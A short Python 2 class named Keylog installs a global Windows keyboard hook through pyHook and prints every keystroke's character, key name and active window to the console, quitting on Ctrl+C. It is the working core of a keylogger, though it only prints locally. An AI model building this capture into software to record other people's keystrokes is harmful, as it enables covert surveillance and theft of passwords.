class Keylog():
  def OnKeyboardEvent(self,event):
    print 'MessageName:',event.MessageName
    print 'Message:',event.Message
    print 'Time:',event.Time
    print 'Window:',event.Window
    print 'WindowName:',event.WindowName
    print 'Ascii:', event.Ascii, chr(event.Ascii)
    print 'Key:', event.Key
    print 'KeyID:', event.KeyID
    print 'ScanCode:', event.ScanCode
    print 'Extended:', event.Extended
    print 'Injected:', event.Injected
    print 'Transition', event.Transition
    print '---'
    
    if int(event.Ascii) == 3:
      print 'Time to quit this bitch'
      import ctypes
      ctypes.windll.user32.PostQuitMessage(0)
      return False
      
    return True
    
  def __init__(self):
    import pythoncom, pyHook
    hm = pyHook.HookManager()
    hm.KeyDown = self.OnKeyboardEvent
    hm.HookKeyboard()
    # wait forever
    return pythoncom.PumpMessages()
